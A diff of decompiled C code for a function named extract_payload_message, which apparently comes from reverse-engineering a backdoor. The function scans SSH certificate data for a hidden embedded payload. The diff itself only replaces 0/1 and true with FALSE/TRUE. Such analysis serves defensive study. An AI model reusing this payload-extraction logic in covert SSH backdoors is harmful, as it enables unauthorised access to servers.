@@ -40,32 +40,32 @@ BOOL extract_payload_message
   size_t i;
   
   if ((sshbuf_data == (sshbuf *)0x0) || (sshbuf_size < 7)) {
-    return 0;
+    return FALSE;
   }
   if ((out_payload_size != (size_t *)0x0) && (ctx != (global_context_t *)0x0)) {
     if (ctx->STR_ssh_rsa_cert_v01_openssh_com == (char *)0x0) {
-      return 0;
+      return FALSE;
     }
     if (ctx->STR_rsa_sha2_256 == (char *)0x0) {
-      return 0;
+      return FALSE;
     }
     puVar3 = sshbuf_data->d;
     if (CARRY8((ulong)puVar3,sshbuf_size)) {
-      return 0;
+      return FALSE;
     }
     uVar4 = 0;
     do {
       str = puVar3 + uVar4;
       lVar7 = 0;
       max_len = sshbuf_size - uVar4;
-      while( true ) {
+      while( TRUE ) {
         cVar2 = ctx->STR_ssh_rsa_cert_v01_openssh_com[lVar7];
         if (((char)str[lVar7] < cVar2) || (cVar2 < (char)str[lVar7])) break;
         lVar7 = lVar7 + 1;
         if (lVar7 == 7) goto LAB_00107fd1;
       }
       lVar7 = 0;
-      while( true ) {
+      while( TRUE ) {
         cVar2 = ctx->STR_rsa_sha2_256[lVar7];
         if (((char)str[lVar7] < cVar2) || (cVar2 < (char)str[lVar7])) break;
         lVar7 = lVar7 + 1;
@@ -80,37 +80,37 @@ LAB_00107fd1:
       uVar6 = *(uint *)(str + -8);
       uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
       if (0x10000 < uVar6) {
-        return 0;
+        return FALSE;
       }
       puVar1 = (uint *)(str + ((ulong)uVar6 - 8));
       if (puVar3 + sshbuf_size < puVar1) {
-        return 0;
+        return FALSE;
       }
       uVar4 = c_strnlen((char *)str,max_len);
       if (max_len <= uVar4) {
-        return 0;
+        return FALSE;
       }
       puVar8 = (uint *)(str + uVar4);
       if (puVar1 <= puVar8) {
-        return 0;
+        return FALSE;
       }
       uVar6 = *puVar8;
       uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
       if (0x10000 < uVar6) {
-        return 0;
+        return FALSE;
       }
       puVar8 = (uint *)((long)puVar8 + (ulong)(uVar6 + 4));
       if (puVar1 <= puVar8) {
-        return 0;
+        return FALSE;
       }
       uVar6 = *puVar8;
       uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
       if (0x10000 < uVar6) {
-        return 0;
+        return FALSE;
       }
       puVar5 = puVar8 + 1;
       if ((uint *)((ulong)uVar6 + (long)puVar5) <= puVar1) {
-        return 0;
+        return FALSE;
       }
       if ((char)puVar8[1] == '\0') {
         puVar5 = (uint *)((long)puVar8 + 5);
@@ -118,9 +118,9 @@ LAB_00107fd1:
       }
       sshbuf_data->d = (u8 *)puVar5;
       *out_payload_size = (ulong)uVar6;
-      return 1;
+      return TRUE;
     }
   }
-  return 0;
+  return FALSE;
 }
 
